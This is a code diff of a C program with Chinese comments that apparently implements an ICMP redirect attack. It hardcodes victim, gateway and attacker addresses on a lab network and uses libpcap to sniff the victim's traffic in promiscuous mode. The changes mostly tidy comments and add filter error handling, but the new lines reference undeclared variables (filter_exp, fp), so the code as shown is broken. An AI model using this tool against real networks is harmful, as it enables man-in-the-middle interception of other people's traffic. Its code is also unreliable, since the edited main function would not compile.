@@ -14,7 +14,7 @@
 
 const unsigned char *Vic_IP = "192.168.64.131";//攻击对象的ip
 const unsigned char *Ori_Gw_IP = "192.168.64.2";//源网关ip
-const unsigned char *Redic_IP = "192.168.64.129";//攻击者ipo
+const unsigned char *Redic_IP = "192.168.64.129";//攻击者ip
 int flag = 0;
 
 /*计算校验和*/  
@@ -95,7 +95,7 @@ void ping_redirect(int sockfd,const unsigned char *data)
 
 
 
-//pcap_loop()不知道如何处理返回值，所以返回值为空，第一个参数是回调函数的最后一个参数，第二个参数是pcap.h头文件定义的，包括数据包被嗅探的时间大小等信息，最后一个参数是一个u_char指针，它包含被pcap_loop()嗅探到的所有包（一个包包含许多属性，它不止一个字符串，而是一个结构体的集合，如一个TCP/IP包包含以太网头部，一个IP头部还有TCP头部，还有此包的有效载荷）这个u_char就是这些结构体的串联版本。pcap嗅探包时正是用之前定义的这些结构体
+//pkthdr由pcap.h头文件定义，包括时间、大小等信息，packet指向嗅探到的包
 void getPacket(u_char * arg, const struct pcap_pkthdr * pkthdr, const u_char * packet)
 {
     int sockfd,res;
@@ -134,44 +134,45 @@ void getPacket(u_char * arg, const struct pcap_pkthdr * pkthdr, const u_char * p
 int main()
 {
     char errBuf[PCAP_ERRBUF_SIZE], * devStr;
-
+    struct bpf_program filter;
+    char filterstr[50]={0};
+    
     /* get a device */
-    devStr = pcap_lookupdev(errBuf);//返回一个合适网络接口的字符串指针，如果出错，则返回errBuf出错字符串，长度为PACP_ERRBUF_SIZE长度
+    devStr = pcap_lookupdev(errBuf);
 
     if(devStr)
-    {
         printf("success: device: %s\n", devStr);
-    }
     else
     {
         printf("error: %s\n", errBuf);
         exit(1);
     }
 
-    /* open a device, wait until a packet arrives */
-    //打开设备进行嗅探，返回一个pcap_t类型的指针，后面操作都要用到这个指针
-    pcap_t * device = pcap_open_live(devStr, 65535, 1, 0, errBuf);     //获得数据包捕获描述字函数（设备名称，参与定义捕获数据的最大字节数，是否置于混杂模式，设置超时时间0表示没有超时等待，errBuf是出错返回NULL时用于传递错误信息）
+    /*捕获数据
+    * 参数：
+    * 设备名称，最大捕获量(字节)，是否置于混杂模式（混杂即捕获设备收发的所有数据），超时时间（0表示没有超时等待），错误信息
+    */
+    pcap_t * handle = pcap_open_live(devStr, 65535, 1, 0, errBuf);    
 
-    struct bpf_program filter;
-    char filterstr[50]={0};
+    //编译filter
+    //参数：filter过滤器指针;filterstr过滤表达式; 1:表达式是否被优化;0：应用此过滤器的掩码
     sprintf(filterstr,"src host %s",Vic_IP);        //将vic_ip按照%s的格式写入filterstr缓冲区
-    //过滤通信，哪些包是用户可以拿到的
-    //表达式被编译，编译完就可使用了
-    pcap_compile(device,&filter,filterstr,1,0);  //函数返回-1为失败，返回其他值为成功
-    //device:会话句柄
-    //&filterstr:被编译的过滤器版本的地址的引用
-    //filterstr:表达式本身,存储在规定的字符串格式里
-    //1:表达式是否被优化的整形量：0：没有，1：有
-    //0：指定应用此过滤器的网络掩码
-    //设置过滤器，使用这个过滤器
-    pcap_setfilter(device,&filter);
-    //device:会话句柄
-    //&filterstr:被编译的表达式版本的引用
-    /* wait loop forever */
-    int id = 0;
-    pcap_loop(device, -1, getPacket, NULL);
-    //device是之前返回的pacp_t类型的指针，-1代表循环抓包直到出错结束，>0表示循环x次，getPacket是回调函数，最后一个参数一般之置为null
+    if (pcap_compile(handle, &filter, filterstr, 1, 0) == -1) {
+		 fprintf(stderr, "Couldn't parse filter %s: %s\n", filter_exp, pcap_geterr(handle));
+		 return 0;
+	 }
+     //启用过滤器
+     if (pcap_setfilter(handle, &filter) == -1) {
+         fprintf(stderr, "Couldn't install filter %s: %s\n", filter_exp, pcap_geterr(handle));
+         return 0;
+     }
+
+
+    //循环抓包
+    //-1表示循环次数，getPacket是回调函数，用于解析数据包，最后参数一般置为null
+    pcap_loop(handle, -1, getPacket, NULL);
     
-    
+    pcap_freecode(&fp);
+    pcap_close(handle);
     return 0;
 }
